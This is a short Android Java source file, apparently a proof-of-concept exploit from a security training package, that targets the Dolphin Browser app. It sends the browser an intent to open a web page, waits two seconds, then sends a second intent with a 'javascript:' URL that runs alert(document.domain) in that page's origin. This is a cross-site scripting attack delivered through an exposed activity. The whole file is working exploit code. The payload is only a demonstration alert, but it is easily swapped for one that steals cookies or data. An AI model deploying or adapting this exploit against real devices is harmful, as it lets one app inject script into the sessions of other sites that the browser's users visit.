package com.attify.dophinvuln;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends Activity {

    	  static final String mPackage = "mobi.mgeek.TunnyBrowser";
    	  static final String mClass =  "BrowserActivity";
    	  static final String mUrl = "http://adityagupta.net/";
    	  static final String mJavascript = "alert(document.domain)";
    	  static final int mSleep = 2000;

    	  @Override
    	  public void onCreate(Bundle savedInstanceState) {
    	      super.onCreate(savedInstanceState);
    	      setContentView(R.layout.activity_main);
    	      startBrowserActivity(mUrl);
    	      try {
    	          Thread.sleep(mSleep);
    	      }
    	      catch (InterruptedException e) {}
    	      startBrowserActivity("javascript:" + mJavascript);

    	  }

    	  private void startBrowserActivity(String url) {
    	      Intent res = new Intent("android.intent.action.VIEW"); 	
    	      res.setComponent(new ComponentName(mPackage,mPackage+"."+mClass));
    	      res.setData(Uri.parse(url));
    	      startActivity(res);
    	  }

    	}